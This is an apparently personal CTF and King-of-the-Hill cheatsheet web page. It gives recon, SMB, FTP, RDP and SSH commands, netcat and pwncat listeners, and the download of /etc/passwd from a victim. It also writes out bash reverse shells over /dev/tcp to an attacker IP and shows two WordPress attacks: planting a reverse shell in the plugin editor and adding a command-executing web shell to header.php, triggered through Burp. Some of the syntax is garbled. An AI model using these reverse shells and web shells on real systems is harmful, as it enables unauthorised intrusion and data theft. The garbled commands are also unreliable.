<h1>PFORM - CTF / KOTH - Cheatsheet</h1>

<h2>Change IP on all scripts in a folder</h2>

If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,

and your IP changes just before the game starts, and no script have the correct ip.

<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>

<b>pform@attacker~script-folder/:<code> grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>

<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>

<h2>RECON</h2> 

<b>pform@attacker~: </b><code>rustscan -A 10.10.10.10</code>

<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.10.10</code>

<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.10.10 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>

<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.10.10</code>

<h2>SMB</h2>

<b>pform@attacker~: </b><code>smbmap -H 10.10.10.10</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10\\C$ -U guest -W WORKGROUP</code>


<h2>FTP</h2>

Is the host vuln to anonymous login?

<b>pform@attacker~: </b><code>ftp 10.10.10.10</code>

<b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>

Dont forget to check for hidden directories like this:

<b>pform@attacker~: </b><code>ls -la</code>

drwxr-xr-x pform pform 0069 Dec 32 00:00 .

drwxr-xr-x pform pform 0069 Dec 32 20:00 ..

drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>     < - - - - - - - - - - - - ( 3 dots )</b>

-rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt


<h2>RDP</h2>

I think remmina is slow, compared to xfreerdp. 

<b>+clipboard</b> makes it possible to copy from <b>attacker machine</b> to <b>victim machine</b>

<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:10.10.10.10</code>

<h2>SSH</h2>

<b>pform@attacker~: </b><code>ssh user@10.10.10.10 -p 22</code>

<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.10.10 -p 22</code>

<h1>Listners</1>

<h2>Netcat</h2>

<b>pform@attacker~: </b><code>nc -lnvp 5555</code>

<h2>pwncat</h2> 
<code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>

<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
  
I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:

<b>pform@local~: </b><code>download /etc/passwd</code>

<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>

Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.

<h1>Revers-Shell</h1>

<h2>Bash</h2>

/bin/bash -i >& /dev/tcp/10.10.10.10/5555

/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'

<b>Wordpress example 1.</b>

After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.

Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>

<b>Wordpress example 2.</b>

<b>Edit "header.php" </b>

Under php tag

<code>echo system($ REQUESTS['cmd']);</code>

change request metod by left click

open upp burp and run command in the bottom of the page:

<code>cmd=whomai</code>

<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>




